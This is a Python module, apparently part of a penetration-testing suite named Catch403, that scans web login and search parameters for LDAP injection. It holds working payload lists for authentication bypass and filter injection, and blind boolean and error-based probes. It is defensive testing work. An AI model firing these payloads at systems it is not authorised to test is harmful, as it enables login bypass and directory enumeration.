#!/usr/bin/python3
"""
LDAP Scanner — LDAP injection testing for Catch403.

Tests: authentication bypass via operator injection, wildcard search injection,
blind boolean LDAP injection, and LDAP filter escape sequence injection.

Covers the OWASP Data Validation: LDAP Injection category.

Usage:
  ../.venv/bin/python3 modules/ldap_scanner.py -u https://target.com/login -d "user=admin&pass=x"
  ../.venv/bin/python3 modules/ldap_scanner.py -u https://target.com/search?q=test
  ../.venv/bin/python3 modules/ldap_scanner.py -u https://target.com/login --user-field username --pass-field password
  ../.venv/bin/python3 modules/ldap_scanner.py -u https://target.com -o results.json
"""
import argparse
import json
import urllib.parse

import requests
import urllib3

from core.colors import bold, end, good, bad, info, run
from core.auth_gate import preflight

urllib3.disable_warnings()

TIMEOUT = 10
UA = {"User-Agent": "Catch403/1.0"}

# ── payload banks ──────────────────────────────────────────────────────────

# Auth bypass — close filter then inject always-true condition
AUTH_BYPASS = [
    # Classic bypass: close user filter, append *)(uid=*)
    "admin)(&)",
    "admin)(|(uid=*))",
    "admin))(|(uid=*",
    "*)(uid=*))(|(uid=*",
    "*)(&(objectclass=*)",
    # Null bytes
    "admin\x00",
    # Wildcard match everything
    "*",
    "admin*",
    "*)(&",
    # Close parentheses injection
    ")(|(cn=*",
    "admin)(|(password=*",
]

# Search/filter injection
SEARCH_PAYLOADS = [
    "*",
    "*)(&",
    "*)(|(cn=*",
    ")(|(objectClass=*",
    "admin*",
    "*)(objectClass=*)(cn=*",
    ")(|(cn=admin)(cn=root",
    # Wildcard extraction
    "a*",
    "*)(&(objectClass=person",
]

# Blind boolean — distinguish true vs false responses
BLIND_TRUE  = ["*", "admin*", "a*"]
BLIND_FALSE = ["xyzzy_nonexistent_user_9999", "aaaa1111bbbb", "ZZZZ_NO_MATCH"]

# Error message patterns that indicate LDAP backend
LDAP_ERROR_PATTERNS = [
    r"ldap_",
    r"LDAP error",
    r"javax\.naming",
    r"NamingException",
    r"com\.sun\.jndi\.ldap",
    r"invalid DN syntax",
    r"invalid filter",
    r"bad search filter",
    r"LDAPException",
    r"unexpected end of filter",
]


def _req(url: str, data: dict | None, params: dict | None,
         headers: dict) -> requests.Response | None:
    try:
        if data is not None:
            return requests.post(url, data=data, headers=headers,
                                 timeout=TIMEOUT, verify=False, allow_redirects=False)
        return requests.get(url, params=params, headers=headers,
                            timeout=TIMEOUT, verify=False, allow_redirects=False)
    except requests.RequestException:
        return None


def _ldap_error_in(text: str) -> bool:
    import re
    return any(re.search(p, text, re.IGNORECASE) for p in LDAP_ERROR_PATTERNS)


def _success_vs_baseline(resp: requests.Response, base_status: int, base_len: int) -> bool:
    if base_status in (401, 403) and resp.status_code in (200, 302):
        return True
    if resp.status_code == base_status:
        return abs(len(resp.text) - base_len) > 50
    return False


def scan(url: str, *, data: str = "", user_field: str = "username",
         pass_field: str = "password", cookie: str = "") -> list[dict]:
    findings: list[dict] = []
    headers = {**UA}
    if cookie:
        headers["Cookie"] = cookie

    parsed = urllib.parse.urlparse(url)
    is_form = bool(data) or bool(parsed.query)

    # Determine mode: POST form, GET params
    post_data = None
    get_params = None
    if data:
        post_data = dict(kv.split("=", 1) for kv in data.split("&") if "=" in kv)
    elif parsed.query:
        get_params = dict(urllib.parse.parse_qsl(parsed.query))
        url_base = urllib.parse.urlunparse(parsed._replace(query=""))
    else:
        return [{"name": "No Parameters", "severity": "info",
                 "detail": "No POST data or GET params to test"}]

    # ── baseline ───────────────────────────────────────────────────────────
    baseline = _req(url if not parsed.query else url_base,
                    post_data, get_params, headers)
    if baseline is None:
        return [{"name": "Connection Failed", "severity": "info", "detail": url}]
    base_status = baseline.status_code
    base_len = len(baseline.text)

    # ── error-based detection ──────────────────────────────────────────────
    error_payloads = ["*)(|(uid=*", ")(|(objectClass=*", "*\\00"]
    for payload in error_payloads:
        if post_data:
            test = {**post_data, user_field: payload}
            r = _req(url, test, None, headers)
        else:
            test = {**get_params}
            first_key = next(iter(test))
            test[first_key] = payload
            r = _req(url_base, None, test, headers)

        if r and _ldap_error_in(r.text):
            findings.append({
                "name": "LDAP Error-Based Injection",
                "severity": "high",
                "detail": (
                    f"LDAP error message visible in response with payload {payload!r}. "
                    "Confirms LDAP backend and injection point."
                ),
                "payload": payload,
                "url": url,
            })
            break

    # ── auth bypass ────────────────────────────────────────────────────────
    for payload in AUTH_BYPASS:
        if post_data:
            test = {**post_data, user_field: payload, pass_field: "*"}
            r = _req(url, test, None, headers)
        else:
            test = {**get_params}
            first_key = next(iter(test))
            test[first_key] = payload
            r = _req(url_base, None, test, headers)

        if r and _success_vs_baseline(r, base_status, base_len):
            findings.append({
                "name": "LDAP Auth Bypass",
                "severity": "critical",
                "detail": (
                    f"Status {base_status}→{r.status_code}. "
                    f"Payload {payload!r} bypassed authentication."
                ),
                "payload": payload,
                "url": url,
            })
            break

    # ── blind boolean injection ────────────────────────────────────────────
    true_responses = []
    false_responses = []

    field = user_field if post_data else (next(iter(get_params)) if get_params else None)
    if field:
        for tp, fp in zip(BLIND_TRUE, BLIND_FALSE):
            if post_data:
                rt = _req(url, {**post_data, field: tp}, None, headers)
                rf = _req(url, {**post_data, field: fp}, None, headers)
            else:
                rt = _req(url_base, None, {**get_params, field: tp}, headers)
                rf = _req(url_base, None, {**get_params, field: fp}, headers)

            if rt and rf:
                true_responses.append((rt.status_code, len(rt.text)))
                false_responses.append((rf.status_code, len(rf.text)))

        if true_responses and false_responses:
            # If true payloads consistently differ from false ones → injectable
            diffs = sum(
                1 for (ts, tl), (fs, fl) in zip(true_responses, false_responses)
                if ts != fs or abs(tl - fl) > 30
            )
            if diffs >= 2:
                findings.append({
                    "name": "Blind LDAP Boolean Injection",
                    "severity": "high",
                    "detail": (
                        f"{diffs}/{len(true_responses)} true/false payload pairs "
                        "produced different responses — parameter is injectable"
                    ),
                    "url": url,
                })

    if not findings:
        findings.append({
            "name": "No LDAP Injection Found",
            "severity": "info",
            "detail": "No LDAP error messages or auth bypass detected",
        })

    return findings


# ── CLI ────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Catch403 LDAP Injection Scanner")
    parser.add_argument("-u", dest="url", required=True)
    parser.add_argument("-d", dest="data", default="",
                        help="POST data: user=admin&pass=x")
    parser.add_argument("--user-field", default="username")
    parser.add_argument("--pass-field", default="password")
    parser.add_argument("--cookie", default="")
    parser.add_argument("-o", dest="output", default="")
    args = parser.parse_args()

    preflight('ldap_scanner', args.url, active=True)

    parsed = urllib.parse.urlparse(args.url)
    print(f"{run} LDAP injection scan: {bold}{parsed.netloc}{parsed.path}{end}\n")

    results = scan(args.url, data=args.data, user_field=args.user_field,
                   pass_field=args.pass_field, cookie=args.cookie)

    for f in results:
        sev = f.get("severity", "info")
        prefix = (bad if sev == "critical"
                  else f"{bold}[{sev.upper()}]{end}" if sev == "high"
                  else info)
        print(f"{prefix} {bold}{f['name']}{end}")
        print(f"        {f['detail']}")
        if f.get("payload"):
            print(f"        Payload: {f['payload']}")

    if args.output:
        with open(args.output, "w") as fh:
            json.dump(results, fh, indent=2)
        print(f"\n{good} Saved to {args.output}")

    crits = [f for f in results if f.get("severity") in ("critical", "high")]
    print()
    if crits:
        print(f"{good} {len(crits)} critical/high finding(s)")
    else:
        print(f"{info} No LDAP injection found")


if __name__ == "__main__":
    main()
